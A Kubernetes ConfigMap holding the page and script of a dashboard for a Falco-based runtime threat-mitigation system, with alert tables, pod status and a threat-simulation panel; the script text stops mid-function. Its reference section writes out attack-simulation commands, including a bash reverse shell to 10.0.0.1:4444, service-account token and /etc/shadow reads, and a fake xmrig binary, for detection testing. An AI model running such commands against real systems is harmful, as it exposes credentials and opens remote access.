apiVersion: v1
kind: ConfigMap
metadata:
  name: rtm-dashboard-html
  namespace: shop
  labels:
    app: rtm-dashboard
    app.kubernetes.io/part-of: rtm-k8s
data:
  index.html: |
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <title>RTM Dashboard — Runtime Threat Mitigation in Kubernetes</title>
      <meta name="description" content="Live read-only dashboard for the RTM Kubernetes Runtime Threat Mitigation system. Shows real-time Falco alerts, pod status, and response actions."/>
      <link rel="stylesheet" href="style.css" />
    </head>
    <body>
    
    <!-- ═══════════════════════════════════════════════════════════════════════
         HEADER
         ════════════════════════════════════════════════════════════════════ -->
    <header class="app-header">
      <div class="header-brand">
        <div class="logo">🛡️</div>
        <div>
          <h1>RTM Dashboard</h1>
          <div class="subtitle">Runtime Threat Mitigation · Kubernetes</div>
        </div>
      </div>
    
      <div class="header-right">
        <div class="status-dot-wrap">
          <div class="status-dot" id="status-dot"></div>
          <span id="status-text">Connecting…</span>
        </div>
        <div class="last-updated" id="last-updated">—</div>
      </div>
    </header>
    
    <!-- ═══════════════════════════════════════════════════════════════════════
         MAIN
         ════════════════════════════════════════════════════════════════════ -->
    <main class="main-content">
    
      <!-- Stale / offline banner -->
      <div class="stale-banner" id="stale-banner">
        <span class="stale-icon">⚠️</span>
        <span id="stale-msg">Controller unreachable.</span>
      </div>
    
      <!-- Config banner -->
      <div class="config-banner">
        <span class="config-label">Live config</span>
        <span class="config-chip" id="cfg-strategy">STRATEGY=…</span>
        <span class="config-chip dry-run-true" id="cfg-dry-run">DRY_RUN=…</span>
        <span class="config-chip" id="cfg-enforce">ENFORCE=…</span>
        <span style="margin-left:auto;font-size:11px;color:var(--text-muted)">
          Read from <code style="font-size:10px">/config</code> · polled every 2.5 s
        </span>
      </div>
    
      <!-- Pipeline strip -->
      <div class="panel">
        <div class="panel-title">Detection &amp; Response Pipeline</div>
        <div class="pipeline-strip">
    
          <!-- Stage 0: Attack -->
          <div class="pipeline-step" id="ps-attack">
            <div class="step-icon-wrap">💻</div>
            <div class="step-label">Attack<br>Trigger</div>
          </div>
          <div class="pipeline-arrow">›</div>
    
          <!-- Stage 1: Falco -->
          <div class="pipeline-step" id="ps-falco">
            <div class="step-icon-wrap">🔭</div>
            <div class="step-label">Falco<br>eBPF detect</div>
          </div>
          <div class="pipeline-arrow">›</div>
    
          <!-- Stage 2: Falcosidekick -->
          <div class="pipeline-step" id="ps-sidekick">
            <div class="step-icon-wrap">📡</div>
            <div class="step-label">Falcosidekick<br>forward</div>
          </div>
          <div class="pipeline-arrow">›</div>
    
          <!-- Stage 3: Controller receive -->
          <div class="pipeline-step" id="ps-receive">
            <div class="step-icon-wrap">📥</div>
            <div class="step-label">Controller<br>receive</div>
          </div>
          <div class="pipeline-arrow">›</div>
    
          <!-- Stage 4: Dedupe / decide -->
          <div class="pipeline-step" id="ps-decide">
            <div class="step-icon-wrap">⚙️</div>
            <div class="step-label">Dedupe &amp;<br>decide</div>
          </div>
          <div class="pipeline-arrow">›</div>
    
          <!-- Stage 5: Safety gate -->
          <div class="pipeline-step" id="ps-gate">
            <div class="step-icon-wrap">🔐</div>
            <div class="step-label">Safety<br>gate</div>
          </div>
          <div class="pipeline-arrow">›</div>
    
          <!-- Stage 6: Action -->
          <div class="pipeline-step" id="ps-action">
            <div class="step-icon-wrap">⚡</div>
            <div class="step-label">Response<br>action</div>
          </div>
    
        </div>
      </div>
    
      <!-- Stats row -->
      <div class="stats-row">
        <div class="stat-card">
          <div class="stat-value" id="stat-total">—</div>
          <div class="stat-label">Alerts (ring buffer)</div>
        </div>
        <div class="stat-card">
          <div class="stat-value green" id="stat-suppressed">—</div>
          <div class="stat-label">Dedupe suppressed</div>
        </div>
        <div class="stat-card">
          <div class="stat-value yellow" id="stat-actions">—</div>
          <div class="stat-label">Actions taken</div>
        </div>
        <div class="stat-card">
          <div class="stat-value" id="stat-kills">—</div>
          <div class="stat-label">Pod kills</div>
        </div>
      </div>
    
      <!-- Alert table -->
      <div class="panel">
        <div class="panel-title-row">
          <div class="panel-title">Live Alert Table (last 50, newest first)</div>
          <button
            class="reset-btn"
            id="reset-btn"
            type="button"
            title="Clear controller alert history and reset decision engine state"
            aria-label="Reset test results"
          >
            <span class="reset-btn-icon" aria-hidden="true">↺</span>
            Reset Test Results
          </button>
        </div>
        <div class="alert-table-wrap">
          <table class="alert-table">
            <thead>
              <tr>
                <th>Time</th>
                <th>Rule ID</th>
                <th>Pod</th>
                <th>Priority</th>
                <th>Hint</th>
                <th>Dedupe</th>
                <th>Dry run</th>
                <th>Gate</th>
                <th>Action taken</th>
                <th>Gate reason</th>
              </tr>
            </thead>
            <tbody id="alert-tbody">
              <tr><td colspan="10" class="table-empty">
                <span class="empty-icon">⏳</span>
                Connecting to controller…
              </td></tr>
            </tbody>
          </table>
        </div>
      </div>
    
      <!-- Two column: pods + attack panel -->
      <div class="two-col">
    
        <!-- Pod grid -->
        <div class="panel">
          <div class="panel-title">Pod Status — shop namespace</div>
          <div class="pod-grid" id="pod-grid">
            <p style="color:var(--text-muted);font-size:13px;">Loading…</p>
          </div>
        </div>
    
        <!-- Threat Injection Panel -->
        <div class="panel threat-panel">
          <div class="panel-header-row">
            <div class="panel-title">INJECT THREAT</div>
            <span class="threat-target-badge">Target: shop/victim (rtm.enforce=true)</span>
          </div>
          <p class="threat-desc">
            Trigger controlled threat simulations on the designated test workload. Detection is verified independently via the Falco &rarr; Falcosidekick &rarr; Controller pipeline.
          </p>
    
          <!-- 2-column grid of threat buttons -->
          <div class="threat-grid">
    
            <button class="threat-btn" id="btn-e1" data-scenario="E1" type="button" title="Trigger E1 Shell Spawn">
              <div class="threat-btn-top">
                <span class="threat-id">E1</span>
                <span class="threat-rule-tag">RTM-001</span>
              </div>
              <div class="threat-name">Shell</div>
              <div class="threat-subtitle">kubectl exec sh</div>
              <div class="threat-spinner" aria-hidden="true"></div>
            </button>
    
            <button class="threat-btn" id="btn-e2" data-scenario="E2" type="button" title="Trigger E2 Token Read">
              <div class="threat-btn-top">
                <span class="threat-id">E2</span>
                <span class="threat-rule-tag">RTM-001 + RTM-003</span>
              </div>
              <div class="threat-name">Token Read</div>
              <div class="threat-subtitle">fires RTM-001 + RTM-003</div>
              <div class="threat-spinner" aria-hidden="true"></div>
            </button>
    
            <button class="threat-btn" id="btn-e3" data-scenario="E3" type="button" title="Trigger E3 Binary in /tmp">
              <div class="threat-btn-top">
                <span class="threat-id">E3</span>
                <span class="threat-rule-tag">RTM-005</span>
              </div>
              <div class="threat-name">Binary in /tmp</div>
              <div class="threat-subtitle">RTM-005</div>
              <div class="threat-spinner" aria-hidden="true"></div>
            </button>
    
            <button class="threat-btn" id="btn-e4" data-scenario="E4" type="button" title="Trigger E4 Reverse Shell Simulation">
              <div class="threat-btn-top">
                <span class="threat-id">E4</span>
                <span class="threat-rule-tag">RTM-007</span>
              </div>
              <div class="threat-name">Reverse Shell</div>
              <div class="threat-subtitle">RTM-007</div>
              <div class="threat-spinner" aria-hidden="true"></div>
            </button>
    
            <button class="threat-btn" id="btn-e5" data-scenario="E5" type="button" title="Trigger E5 Sensitive File Read">
              <div class="threat-btn-top">
                <span class="threat-id">E5</span>
                <span class="threat-rule-tag">RTM-002</span>
              </div>
              <div class="threat-name">Sensitive File</div>
              <div class="threat-subtitle">cat /etc/shadow</div>
              <div class="threat-spinner" aria-hidden="true"></div>
            </button>
    
            <button class="threat-btn" id="btn-e6" data-scenario="E6" type="button" title="Trigger E6 Package Tool Execution">
              <div class="threat-btn-top">
                <span class="threat-id">E6</span>
                <span class="threat-rule-tag">RTM-004</span>
              </div>
              <div class="threat-name">Package Tool</div>
              <div class="threat-subtitle">pip / apt exec</div>
              <div class="threat-spinner" aria-hidden="true"></div>
            </button>
    
            <button class="threat-btn" id="btn-e7" data-scenario="E7" type="button" title="Trigger E7 Public Egress Connection">
              <div class="threat-btn-top">
                <span class="threat-id">E7</span>
                <span class="threat-rule-tag">RTM-006</span>
              </div>
              <div class="threat-name">Public Egress</div>
              <div class="threat-subtitle">connect public IP</div>
              <div class="threat-spinner" aria-hidden="true"></div>
            </button>
    
            <button class="threat-btn" id="btn-e8" data-scenario="E8" type="button" title="Trigger E8 Crypto Miner Simulation">
              <div class="threat-btn-top">
                <span class="threat-id">E8</span>
                <span class="threat-rule-tag">RTM-008</span>
              </div>
              <div class="threat-name">Crypto Miner</div>
              <div class="threat-subtitle">xmrig / miner port</div>
              <div class="threat-spinner" aria-hidden="true"></div>
            </button>
    
          </div>
    
          <!-- Simulation & Correlation Feedback Card -->
          <div class="simulation-feedback" id="simulation-feedback">
            <div class="feedback-header">
              <span class="feedback-status-dot idle" id="feedback-dot"></span>
              <span class="feedback-title" id="feedback-title">Simulation Pipeline: Ready</span>
              <span class="feedback-sim-id" id="feedback-sim-id"></span>
            </div>
            <div class="feedback-body" id="feedback-body">
              Select a threat scenario above to launch a controlled simulation against the test victim pod.
            </div>
            <div class="feedback-pipeline-steps" id="feedback-steps" style="display:none;">
              <div class="fb-step" id="fb-step-exec">
                <span class="fb-step-icon">1</span>
                <span class="fb-step-text">Simulate</span>
              </div>
              <div class="fb-arrow">&rarr;</div>
              <div class="fb-step" id="fb-step-detect">
                <span class="fb-step-icon">2</span>
                <span class="fb-step-text">Falco Detect</span>
              </div>
              <div class="fb-arrow">&rarr;</div>
              <div class="fb-step" id="fb-step-decision">
                <span class="fb-step-icon">3</span>
                <span class="fb-step-text">RTM Decision</span>
              </div>
              <div class="fb-arrow">&rarr;</div>
              <div class="fb-step" id="fb-step-gate">
                <span class="fb-step-icon">4</span>
                <span class="fb-step-text">Safety Gate</span>
              </div>
            </div>
          </div>
    
          <!-- Collapsible manual terminal reference commands -->
          <details class="manual-terminal-details">
            <summary>Manual terminal commands (reference)</summary>
            <div class="attack-panel" style="margin-top:12px;">
              <div>
                <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E1 ? Shell spawn (RTM-001)</div>
                <div class="attack-cmd">
                  <code>kubectl exec -n shop deploy/victim -- sh -c "echo test"</code>
                  <button class="copy-btn">Copy</button>
                </div>
              </div>
    
              <div>
                <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E2 ? SA token read (RTM-003)</div>
                <div class="attack-cmd">
                  <code>kubectl exec -n shop deploy/victim -- cat /var/run/secrets/kubernetes.io/serviceaccount/token</code>
                  <button class="copy-btn">Copy</button>
                </div>
              </div>
    
              <div>
                <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E3 ? Binary from /tmp (RTM-005)</div>
                <div class="attack-cmd">
                  <code>kubectl exec -n shop deploy/victim -- sh -c "cp /bin/sh /tmp/evil && /tmp/evil -c id"</code>
                  <button class="copy-btn">Copy</button>
                </div>
              </div>
    
              <div>
                <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E4 ? Reverse shell (RTM-007)</div>
                <div class="attack-cmd">
                  <code>kubectl exec -n shop deploy/victim -- bash -c "timeout 2 bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1 || true"</code>
                  <button class="copy-btn">Copy</button>
                </div>
              </div>
    
              <div>
                <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E5 — Sensitive file read (RTM-002)</div>
                <div class="attack-cmd">
                  <code>kubectl exec -n shop deploy/victim -- cat /etc/shadow</code>
                  <button class="copy-btn">Copy</button>
                </div>
              </div>
    
              <div>
                <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E6 — Package manager / download tool (RTM-004)</div>
                <div class="attack-cmd">
                  <code>kubectl exec -n shop deploy/victim -- pip --version</code>
                  <button class="copy-btn">Copy</button>
                </div>
              </div>
    
              <div>
                <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E7 — Public egress connection (RTM-006)</div>
                <div class="attack-cmd">
                  <code>kubectl exec -n shop deploy/victim -- curl -m 2 -s -o /dev/null https://1.1.1.1</code>
                  <button class="copy-btn">Copy</button>
                </div>
              </div>
    
              <div>
                <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E8 — Crypto-miner indicator (RTM-008)</div>
                <div class="attack-cmd">
                  <code>kubectl exec -n shop deploy/victim -- sh -c "cp /bin/sleep /tmp/xmrig && /tmp/xmrig 0.1 && rm -f /tmp/xmrig"</code>
                  <button class="copy-btn">Copy</button>
                </div>
              </div>
    
              <div>
                <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">Port-forward to view this dashboard</div>
                <div class="attack-cmd">
                  <code>kubectl port-forward svc/rtm-controller -n rtm-system 8000:8000</code>
                  <button class="copy-btn">Copy</button>
                </div>
              </div>
            </div>
          </details>
        </div>
    
      </div><!-- /two-col -->
    
    </main>
    
    <script src="app.js"></script>
    <div id="toast-container"></div>
    </body>
    </html>
  app.js: |
    /**
     * RTM Dashboard — app.js
     *
     * Polls GET /alerts/recent, GET /pods/status, GET /config every 2 s.
     * Read-only — no POST/DELETE/PATCH calls.  No framework, no build step.
     * All numbers shown on the page come from live polls — no constants.
     *
     * CORS note: the controller must have CORSMiddleware enabled (allow_origins
     * includes "null" for file:// and the localhost ports).
     */
    
    'use strict';
    
    // ─── Configuration ───────────────────────────────────────────────────────────
    const urlParams   = new URLSearchParams(window.location.search);
    const API_BASE    = urlParams.get('api') ||
                        (window.location.protocol.startsWith('http') && window.location.port === '8000' ? '' : 'http://localhost:8000');
    const POLL_MS     = 2500;           // poll interval
    const STALE_MS    = 10_000;         // mark stale if no success for 10 s
    
    // ─── State ───────────────────────────────────────────────────────────────────
    let lastSuccessTs   = null;
    let lastAlertCount  = 0;
    let staleTimer      = null;
    let knownAlertIds   = new Set();    // track "ts+pod+rtm_id" to flash new rows
    
    // ─── DOM helpers ─────────────────────────────────────────────────────────────
    const $  = id => document.getElementById(id);
    const qs = sel => document.querySelector(sel);
    
    // ─── Utility ─────────────────────────────────────────────────────────────────
    function fmtTs(unix) {
      if (!unix) return '—';
      const d = unix > 1e12 ? new Date(unix) : new Date(unix * 1000);
      return d.toLocaleTimeString([], { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
    }
    
    function fmtIso(iso) {
      if (!iso) return '—';
      return new Date(iso).toLocaleTimeString([], { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
    }
    
    function alertKey(a) {
      return `${a.ts}|${a.pod}|${a.rtm_id}`;
    }
    
    function priorityClass(p) {
      if (!p) return 'badge-muted';
      const l = p.toLowerCase();
      if (l === 'critical') return 'badge-red';
      if (l === 'error')    return 'badge-orange';
      if (l === 'warning')  return 'badge-yellow';
      return 'badge-muted';
    }
    
    function actionClass(action) {
      if (!action) return 'badge-muted';
      const a = action.toLowerCase();
      if (a === 'kill_pod')         return 'badge-red';
      if (a === 'isolate_network')  return 'badge-yellow';
      if (a === 'alert_only')       return 'badge-green';
      if (a === 'suppressed')       return 'badge-muted';
      return 'badge-muted';
    }
    
    // ─── Stale / Error state ──────────────────────────────────────────────────────
    function setConnected() {
      lastSuccessTs = Date.now();
      $('status-dot').className   = 'status-dot';
      $('status-text').textContent = 'Connected';
      $('stale-banner').classList.remove('visible');
    }
    
    function setStale(errMsg) {
      $('status-dot').className   = 'status-dot stale';
      $('status-text').textContent = 'Stale';
      const banner = $('stale-banner');
      banner.classList.add('visible');
      $('stale-msg').textContent = errMsg
        ? `Controller unreachable: ${errMsg}`
        : `No successful poll in the last ${STALE_MS / 1000} s. Data may be outdated.`;
    }
    
    function setError(errMsg) {
      $('status-dot').className   = 'status-dot error';
      $('status-text').textContent = 'Offline';
      const banner = $('stale-banner');
      banner.classList.add('visible');
      $('stale-msg').textContent = `Controller unreachable — ${errMsg}`;
    }
    
    // ─── Config banner ────────────────────────────────────────────────────────────
    function renderConfig(cfg) {
      const s = (cfg.strategy || '—').toLowerCase();
      const d = cfg.dry_run;
      const e = cfg.enforce_label_selector || '—';
    
      $('cfg-strategy').textContent = `STRATEGY=${s}`;
      const dryChip = $('cfg-dry-run');
      dryChip.textContent = `DRY_RUN=${d}`;
      dryChip.className   = `config-chip ${d ? 'dry-run-true' : 'dry-run-false'}`;
      $('cfg-enforce').textContent  = `ENFORCE=${e}`;
    }
    
    // ─── Pipeline strip ───────────────────────────────────────────────────────────
    /**
     * Stages (0-indexed):
     *  0 Attack trigger     — always dim; user runs it manually
     *  1 Falco detection    — alert.ts present
     *  2 Falcosidekick fwd  — alert received (received_at present)
     *  3 Controller receive — same as above (combined with 2)
     *  4 Dedupe / decide    — decided_at present
     *  5 Safety gate        — decided_at present (gate evaluation done)
     *  6 Action             — action_taken present and not null/suppressed
     */
    function renderPipeline(alerts) {
      const recent = alerts.slice(-20);  // look at last 20
    
      // Stage 1: any alert with a ts
      const s1 = recent.some(a => a.ts);
      // Stage 2+3: received_at
      const s2 = recent.some(a => a.received_at);
      // Stage 4: decided_at
      const s4 = recent.some(a => a.decided_at);
      // Stage 5: gate evaluated (decided_at present)
      const s5 = s4;
      // Stage 6: real action taken
      const s6 = recent.some(a => a.action_taken && a.action_taken !== 'suppressed');
    
      // gate blocked on most recent decided alert?
      const lastDecided = [...recent].reverse().find(a => a.decided_at);
      const gateBlocked = lastDecided && lastDecided.gate_blocked_reason;
    
      const steps = [
        { id: 'ps-attack',   active: false,                              warn: false, danger: false },
        { id: 'ps-falco',    active: s1,                                 warn: false, danger: false },
        { id: 'ps-sidekick', active: s2,                                 warn: false, danger: false },
        { id: 'ps-receive',  active: s2,                                 warn: false, danger: false },
        { id: 'ps-decide',   active: s4,                                 warn: false, danger: false },
        { id: 'ps-gate',     active: s5, warn: !!gateBlocked,           danger: false },
        { id: 'ps-action',   active: s6, warn: false,                   danger: s6 && lastDecided && lastDecided.action_taken === 'kill_pod' },
      ];
    
      for (const step of steps) {
        const el = $(step.id);
        if (!el) continue;
        el.classList.toggle('active', step.active);
        el.classList.toggle('warn',   step.active && step.warn);
        el.classList.toggle('danger', step.active && step.danger);
      }
    }
    
    // ─── Stats row ────────────────────────────────────────────────────────────────
    function renderStats(alerts) {
      const total     = alerts.length;
      const actions   = alerts.filter(a => a.action_taken && a.action_taken !== 'suppressed' && a.action_taken !== null).length;
      const kills     = alerts.filter(a => a.action_taken === 'kill_pod').length;
      const suppressed= alerts.filter(a => a.dedupe_suppressed === true).length;
    
      $('stat-total').textContent     = total;
      $('stat-actions').textContent   = actions;
      $('stat-kills').textContent     = kills;
      $('stat-suppressed').textContent= suppressed;
    
      $('stat-kills').className = `stat-value ${kills > 0 ? 'red' : ''}`;
      $('stat-actions').className = `stat-value ${actions > 0 ? 'yellow' : 'green'}`;
    }
    
    // ─── Alert table ─────────────────────────────────────────────────────────────
    function renderAlerts(alerts) {
      const tbody = $('alert-tbody');
      const toShow = [...alerts].reverse().slice(0, 50);
    
      if (toShow.length === 0) {
        tbody.innerHTML = `
          <tr><td colspan="10" class="table-empty">
            <span class="empty-icon">🔍</span>
            No RTM alerts received yet. Run an attack scenario to populate.
          </td></tr>`;
        return;
      }
    
      const rows = toShow.map(a => {
        const key  = alertKey(a);
        const isNew = !knownAlertIds.has(key);
    
        const rtmBadge      = `<span class="badge badge-rtm">${a.rtm_id || '—'}</span>`;
        const priBadge      = `<span class="badge ${priorityClass(a.priority)}">${a.priority || '—'}</span>`;
        const hintBadge     = `<span class="badge badge-muted">${a.response_hint || '—'}</span>`;
        const dedupeTxt     = a.dedupe_suppressed === null ? '—' :
                              a.dedupe_suppressed ? '<span class="badge badge-muted">suppressed</span>' :
                                                   '<span class="badge badge-green">passed</span>';
        const dryBadge      = a.dry_run === null  ? '—' :
                              a.dry_run           ? '<span class="badge badge-yellow">dry</span>' :
                                                   '<span class="badge badge-red">live</span>';
        const actionBadge   = a.action_taken
                              ? `<span class="badge action-badge ${actionClass(a.action_taken)}">${a.action_taken}</span>`
                              : '—';
        const gateTxt       = a.gate_blocked_reason
                              ? `<span class="badge badge-yellow" title="${a.gate_blocked_reason}">blocked</span>`
                              : (a.decided_at ? '<span class="badge badge-green">passed</span>' : '—');
    
        const podShort = a.pod ? a.pod.replace(/-[a-z0-9]{9,}$/, '-…') : '—';
    
        return `<tr class="${isNew ? 'new-row' : ''}" data-key="${key}">
          <td>${fmtIso(a.ts)}</td>
          <td>${rtmBadge}</td>
          <td title="${a.pod || ''}">${podShort}</td>
          <td>${priBadge}</td>
          <td>${hintBadge}</td>
          <td>${dedupeTxt}</td>
          <td>${dryBadge}</td>
          <td>${gateTxt}</td>
          <td>${actionBadge}</td>
          <td>${a.gate_blocked_reason ? `<span style="font-size:9px;color:var(--text-muted);max-width:120px;overflow:hidden;text-overflow:ellipsis;display:inline-block" title="${a.gate_blocked_reason}">${a.gate_blocked_reason}</span>` : '—'}</td>
        </tr>`;
      });
    
      tbody.innerHTML = rows.join('');
    
      // track seen
      toShow.forEach(a => knownAlertIds.add(alertKey(a)));
    }
    
    // ─── Pod grid ─────────────────────────────────────────────────────────────────
    function renderPods(pods) {
      const container = $('pod-grid');
      if (!pods || pods.length === 0) {
        container.innerHTML = '<p style="color:var(--text-muted);font-size:13px;">No pods found.</p>';
        return;
      }
    
      const cards = pods.map(p => {
        const enforced   = p.rtm_enforce === 'true';
        const restricted = p.rtm_tier === 'restrict';
        const phase      = (p.phase || 'Unknown').toLowerCase();
    
        const labelPills = [];
        if (enforced)   labelPills.push('<span class="badge badge-green">rtm.enforce=true</span>');
        if (restricted) labelPills.push('<span class="badge badge-yellow">rtm.tier=restrict</span>');
        if (!enforced && !restricted) labelPills.push('<span class="badge badge-muted">no enforce label</span>');
    
        const restartTxt = p.restart_count > 0
          ? `<span style="color:var(--orange)">${p.restart_count} restart${p.restart_count !== 1 ? 's' : ''}</span>`
          : `${p.restart_count} restarts`;
    
        return `
          <div class="pod-card ${enforced ? 'enforced' : ''} ${restricted ? 'restricted' : ''}">
            <div class="pod-name" title="${p.name}">${p.name}</div>
            <div class="pod-labels">${labelPills.join('')}</div>
            <div class="pod-meta">
              <span class="pod-phase ${phase}">${phase}</span>
              <span style="font-family:var(--mono);font-size:10px">${restartTxt}</span>
            </div>
          </div>`;
      });
    
      container.innerHTML = cards.join('');
    }
    
    // ─── Polling ──────────────────────────────────────────────────────────────────
    async function fetchJSON(path) {
      const r = await fetch(API_BASE + path, { cache: 'no-store' });
      if (!r.ok) throw new Error(`HTTP ${r.status}`);
      return r.json();
    }
    
    async function poll() {
      try {
        const [alertsRes, podsRes, cfgRes] = await Promise.all([
          fetchJSON('/alerts/recent'),
          fetchJSON('/pods/status?namespace=shop'),
          fetchJSON('/config'),
        ]);
    
        setConnected();
        $('last-updated').textContent = 'Updated ' + new Date().toLocaleTimeString();
    
        const alerts = alertsRes.alerts || [];
        const pods   = podsRes.pods   || [];
    
        renderConfig(cfgRes);
        renderPipeline(alerts);
        renderStats(alerts);
        renderAlerts(alerts);
        renderPods(pods);
    
        lastAlertCount = alerts.length;
    
      } catch (err) {
        const ageMs = lastSuccessTs ? (Date.now() - lastSuccessTs) : Infinity;
        if (ageMs > STALE_MS) {
          setError(err.message);
        } else {
          setStale(err.message);
        }
        console.warn('RTM poll error:', err.message);
      }
    }
    
    // ─── Copy buttons ─────────────────────────────────────────────────────────────
    
    // ─── Threat Injection Simulation ─────────────────────────────────────────────
    let isSimulationRunning = false;
    
    function initThreatInjection() {
      const buttons = document.querySelectorAll('.threat-btn');
      buttons.forEach(btn => {
        btn.addEventListener('click', () => {
          const scenario = btn.getAttribute('data-scenario');
          if (!scenario) return;
          triggerSimulation(scenario, btn);
        });
      });
    }
    
    function setButtonsDisabled(disabled) {
      document.querySelectorAll('.threat-btn').forEach(b => {
        b.disabled = disabled;
      });
    }
    
    function setSimulationError(scenario, errorMsg, btn) {
      if (btn) {
        btn.classList.remove('loading', 'active-injecting');
      }
      setButtonsDisabled(false);
      isSimulationRunning = false;
    
      const card = $('simulation-feedback');
      if (card) card.className = 'simulation-feedback error';
      const dot = $('feedback-dot');
      if (dot) dot.className = 'feedback-status-dot error';
      const title = $('feedback-title');
      if (title) title.textContent = `Simulation Failed (${scenario})`;
      const body = $('feedback-body');
      if (body) {
        body.innerHTML = `<span style="color:var(--red);font-weight:500">Error:</span> ${errorMsg}`;
      }
      const stepExec = $('fb-step-exec');
      if (stepExec) stepExec.className = 'fb-step failed';
    }
    
    async function triggerSimulation(scenario, btn) {
      if (isSimulationRunning) return;
      isSimulationRunning = true;
    
      // 1. Disable all buttons, mark active button loading
      setButtonsDisabled(true);
      btn.classList.add('loading', 'active-injecting');
    
      // 2. Setup feedback UI
      const card = $('simulation-feedback');
      const dot = $('feedback-dot');
      const title = $('feedback-title');
      const simIdEl = $('feedback-sim-id');
      const body = $('feedback-body');
      const steps = $('feedback-steps');
    
      if (card) card.className = 'simulation-feedback running';
      if (dot) dot.className = 'feedback-status-dot running';
      if (steps) steps.style.display = 'flex';
      if (simIdEl) simIdEl.textContent = 'executing…';
    
      $('fb-step-exec').className = 'fb-step active';
      $('fb-step-detect').className = 'fb-step';
      $('fb-step-decision').className = 'fb-step';
      $('fb-step-gate').className = 'fb-step';
    
      const scenName = btn.querySelector('.threat-name')?.textContent || scenario;
      if (title) title.textContent = `Injecting ${scenario} (${scenName})…`;
      if (body) {
        body.innerHTML = `Executing controlled simulation command in test workload <code>shop/victim</code>…`;
      }
    
      // 3. Post to backend simulation API
      let simData;
      try {
        const res = await fetch(API_BASE + '/simulate', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ scenario }),
        });
    
        if (!res.ok) {
          let detail = `Server responded with HTTP ${res.status}`;
          try {
            const errJson = await res.json();
            if (errJson.detail) detail = errJson.detail;
          } catch (_) {}
          setSimulationError(scenario, detail, btn);
          return;
        }
    
        simData = await res.json();
      } catch (err) {
        setSimulationError(scenario, `Network error: ${err.message}`, btn);
        return;
      }
    
      // 4. Simulation command executed in container
      $('fb-step-exec').className = 'fb-step done';
      if (simIdEl) simIdEl.textContent = simData.simulation_id || '';
      $('fb-step-detect').className = 'fb-step active';
    
      if (title) title.textContent = `Simulation Completed · Awaiting Falco Detection…`;
      if (body) {
        body.innerHTML = `Simulation command executed in <code>${simData.target?.pod || 'victim'}</code> (${simData.duration_s} s). Awaiting Falco kernel eBPF detection &amp; controller pipeline…`;
      }
    
      // 5. Correlate with real alert arriving via Falco -> Falcosidekick -> Controller pipeline
      await correlateAlert(simData, btn);
    }
    
    async function correlateAlert(simData, btn) {
      const maxWaitMs = 14000;
      const pollIntervalMs = 750;
      const startTime = Date.now();
      const expectedRules = simData.expected_rules || [];
      const targetPod = simData.target?.pod;
      const execTs = simData.executed_at || (startTime / 1000);
    
      let matchedAlert = null;
    
      while ((Date.now() - startTime) < maxWaitMs) {
        try {
          const res = await fetchJSON('/alerts/recent');
          const alerts = res.alerts || [];
    
          // Look for a real alert matching the victim workload and rule emitted at or after execution
          matchedAlert = alerts.find(a => {
            const alertTs = a.received_at || (a.ts ? new Date(a.ts).getTime() / 1000 : 0);
            const matchesPod = a.pod && (a.pod === targetPod || a.pod.includes('victim'));
            const matchesRule = expectedRules.includes(a.rtm_id);
            const isRecent = alertTs >= (execTs - 3.5);
            return matchesPod && matchesRule && isRecent;
          });
    
          if (matchedAlert) break;
        } catch (e) {
          console.warn('Correlation poll error:', e);
        }
    
        await new Promise(r => setTimeout(r, pollIntervalMs));
      }
    
      const card = $('simulation-feedback');
      const dot = $('feedback-dot');
      const title = $('feedback-title');
      const body = $('feedback-body');
    
      if (matchedAlert) {
        // 6. Threat successfully detected via real pipeline
        $('fb-step-detect').className = 'fb-step done';
        $('fb-step-decision').className = 'fb-step done';
        $('fb-step-gate').className = 'fb-step done';
    
        if (card) card.className = 'simulation-feedback success';
        if (dot) dot.className = 'feedback-status-dot success';
    
        const ruleBadge = `<span class="badge badge-rtm">${matchedAlert.rtm_id}</span>`;
        const priBadge  = `<span class="badge ${priorityClass(matchedAlert.priority)}">${matchedAlert.priority || '—'}</span>`;
        const actionBadge = matchedAlert.action_taken
          ? `<span class="badge action-badge ${actionClass(matchedAlert.action_taken)}">${matchedAlert.action_taken}</span>`
          : '—';
    
        let gateHtml;
        if (matchedAlert.gate_blocked_reason) {
          gateHtml = `<span class="badge badge-yellow">Blocked: ${matchedAlert.gate_blocked_reason}</span>`;
        } else if (matchedAlert.dry_run) {
          gateHtml = `<span class="badge badge-yellow">DRY_RUN=true (Enforcement Safety Guard Active)</span>`;
        } else {
          gateHtml = `<span class="badge badge-green">Enforcement Live</span>`;
        }
    
        const elapsedTotal = ((Date.now() - (execTs * 1000)) / 1000).toFixed(2);
    
        if (title) {
          title.innerHTML = `Threat Detected: ${matchedAlert.rtm_id} &middot; Decision Evaluated`;
        }
    
        if (body) {
          body.innerHTML = `
            <div style="margin-bottom:6px">
              <strong>Detection:</strong> ${ruleBadge} <code>${matchedAlert.rule || ''}</code> &middot; ${priBadge}
            </div>
            <div style="margin-bottom:6px">
              <strong>Decision Action:</strong> ${actionBadge} &nbsp;&middot;&nbsp; <strong>Safety Gate:</strong> ${gateHtml}
            </div>
            <div style="font-size:11px;color:var(--text-muted);font-family:var(--mono);margin-top:4px">
              Workload: ${matchedAlert.pod || targetPod} &middot; Exec: ${simData.duration_s}s &middot; End-to-end detection: ${elapsedTotal}s
            </div>
          `;
        }
    
        // Immediately trigger a full dashboard poll to update the live table and pipeline
        poll();
    
      } else {
